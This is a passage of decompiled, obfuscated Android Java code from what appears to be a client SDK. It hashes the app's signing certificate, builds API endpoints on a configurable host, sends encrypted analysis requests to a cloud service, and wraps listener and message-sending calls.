        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(packageInfo.signatures[0].toByteArray());
        try {
            certificateFactory = CertificateFactory.getInstance("X509");
        } catch (CertificateException e3) {
            e3.printStackTrace();
            certificateFactory = null;
        }
        try {
            x509Certificate = (X509Certificate) certificateFactory.generateCertificate(byteArrayInputStream);
        } catch (CertificateException e4) {
            e4.printStackTrace();
            x509Certificate = null;
        }
        try {
            return a(MessageDigest.getInstance("MD5").digest(x509Certificate.getEncoded()));
        } catch (NoSuchAlgorithmException e5) {
            e5.printStackTrace();
            return null;
        } catch (CertificateEncodingException e6) {
            e6.printStackTrace();
            return null;
        }
    }

    public String getStackString(Throwable th) {
        StringWriter stringWriter = new StringWriter();
        PrintWriter printWriter = new PrintWriter(stringWriter);
        th.printStackTrace(printWriter);
        printWriter.close();
        return stringWriter.toString();
    }

    public boolean getStatus() {
        boolean g2 = g();
        l = 0;
        return g2;
    }

    public boolean hasSkip() {
        return !TextUtils.isEmpty(this.z.a());
    }

    public void initHost(String str) {
        f2954c = str;
        d = String.format("%s/api/v1/phones", new Object[]{f2954c});
        e = String.format("%s/api/v1/phones/referer", new Object[]{f2954c});
        f = String.format("%s/api/v1/where_is_the_way", new Object[]{f2954c});
    }

    public synchronized List<d> manual(int i2, AnalyseResult analyseResult) {
        if (!m) {
            return null;
        }
        k = -1;
        h = null;
        h = analyseResult;
        if (!a(h)) {
            return null;
        }
        if (k == 0) {
            e();
            return null;
        } else if (this.C) {
            b("busying now\n$$$ failed", 1);
            return null;
        } else {
            b();
            c();
            f();
            this.r = i2;
            JSONObject d2 = d();
            new Thread(new f(this)).start();
            ConditionVariable conditionVariable = new ConditionVariable(false);
            b(String.format("正在云端  [%s]  字组查找方案 请等待...", new Object[]{this.o[i2]}), 2);
            d2.put("category", i2);
            d2.put("sdkV", "4.0.14");
            d2.put("rtp", f2953b);
            x a2 = new y().a("body", a.a(d2.toString())).a();
            g.a();
            g.b("######\n" + String.format("<analyseQ.Enc>:%s\n", new Object[]{a2.toString()}));
            conditionVariable.close();
            ArrayList arrayList = new ArrayList();
            g.a(new ap().a(d).a((aq) a2).a()).a(new g(this, arrayList, conditionVariable));
            conditionVariable.block();
            return arrayList;
        }
    }

    public boolean registerStatus(boolean z2, KingListener kingListener) {
        if (!getStatus()) {
            return false;
        }
        if (kingListener == null) {
            kingListener = this.p;
        }
        if (z2) {
            try {
                i.a((Context) mContext).a((IDFEE16B42C8B2890D8FF2860AF5562B1) kingListener);
                return true;
            } catch (Exception e2) {
                e2.printStackTrace();
                return false;
            }
        } else {
            i.a((Context) mContext).a(kingListener);
            return true;
        }
    }

    public boolean sendData(String str, int i2, byte[] bArr) {
        try {
            return i.a((Context) mContext).a(str, i2, bArr);
        } catch (Exception e2) {
            e2.printStackTrace();
            return false;
        }
    }

    public boolean sendmsg(String str, String str2) {
        try {
            return i.a((Context) mContext).a(str, str2);
        } catch (Exception e2) {
            e2.printStackTrace();
            return false;
        }
    }
}
